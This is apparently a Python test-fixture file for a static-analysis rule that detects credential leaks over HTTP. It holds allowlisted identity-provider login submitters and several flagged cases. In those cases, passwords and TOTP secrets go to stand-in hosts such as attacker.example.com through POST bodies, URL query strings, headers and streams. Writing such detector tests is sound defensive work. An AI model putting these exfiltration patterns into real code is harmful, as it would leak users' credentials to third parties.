"""Test fixtures for CredLeak-UnknownHttp.

The four allowlisted submitter functions
(_submit_simplesaml_password, _submit_simplesaml_otp,
_submit_shib_idp_login, PandA._submit_cas_login) MUST be allowed to send
credentials. Anything else MUST be flagged.
"""

import httpx


class KyotoUAuth:
    def __init__(self, username: str, password: str, *, totp_secret: str | None = None):
        self._username = username
        self._password = password
        self._totp_secret = totp_secret
        self._http = httpx.Client()

    @property
    def password(self) -> str:
        return self._password

    @property
    def username(self) -> str:
        return self._username

    def _resolve_otp(self) -> str:
        return "123456"


class _SPService:
    def __init__(self, auth: KyotoUAuth):
        self._auth = auth

    @property
    def http(self) -> httpx.Client:
        return self._auth._http


# --- Negative cases: legitimate IdP submitters (allowlisted) ---

class ShibbolethSPService(_SPService):
    def _submit_simplesaml_password(self, action: str) -> httpx.Response:
        data = {"username": self._auth.username, "password": self._auth._password}  # OK
        return self.http.post(action, data=data)

    def _submit_simplesaml_otp(self, action: str) -> httpx.Response:
        data = {"username": self._auth.username, "password": self._auth._resolve_otp()}  # OK
        return self.http.post(action, data=data)

    def _submit_shib_idp_login(self, action: str) -> httpx.Response:
        data = {"j_username": self._auth.username, "j_password": self._auth._password}  # OK
        return self.http.post(action, data=data)


class PandA(_SPService):
    def _submit_cas_login(self, action: str) -> httpx.Response:
        data = {"username": self._auth.username, "password": self._auth._password}  # OK
        return self.http.post(action, data=data)


# --- Positive cases: should be flagged ---

class TelemetrySneak(_SPService):
    def report(self) -> None:
        # NOT OK — exfiltrates password to non-IdP host.
        self.http.post(
            "https://metrics.example.com/auth",
            json={"pw": self._auth._password},
        )

    def report_via_url(self) -> None:
        # NOT OK — credential in URL querystring.
        self.http.get(f"https://example.com/log?secret={self._auth._totp_secret}")

    def report_via_header(self) -> None:
        # NOT OK — credential in custom header.
        self.http.get(
            "https://example.com",
            headers={"X-Pw": self._auth._password},
        )


class FakeSubmitter(_SPService):
    """Same-named helper but in a non-allowlisted class — must be flagged.

    The allowlist for ``_submit_cas_login`` is pinned to the ``PandA``
    class. Any other class with the same method name is NOT trusted.
    """
    def _submit_cas_login(self, action: str) -> httpx.Response:
        # NOT OK — wrong class.
        return self.http.post(
            "https://attacker.example.com/cas",
            data={"password": self._auth._password},
        )


class GenericHelpers(_SPService):
    """Exercises ``client.request`` / ``client.stream`` — these have a
    different signature from get/post (verb is arg 0, URL is arg 1)."""

    def report_via_request(self) -> httpx.Response:
        # NOT OK — credential interpolated into the URL at arg index 1.
        return self.http.request(
            "POST",
            f"https://example.com/log?secret={self._auth._totp_secret}",
        )

    def report_via_stream(self) -> None:
        # NOT OK — credential in a stream URL.
        with self.http.stream(
            "GET",
            f"https://example.com/log?pw={self._auth._password}",
        ) as r:
            r.read()

    def report_via_request_url_kwarg(self) -> httpx.Response:
        # NOT OK — same call but using ``url=`` kwarg.
        return self.http.request(
            method="POST",
            url=f"https://example.com/log?secret={self._auth._totp_secret}",
        )
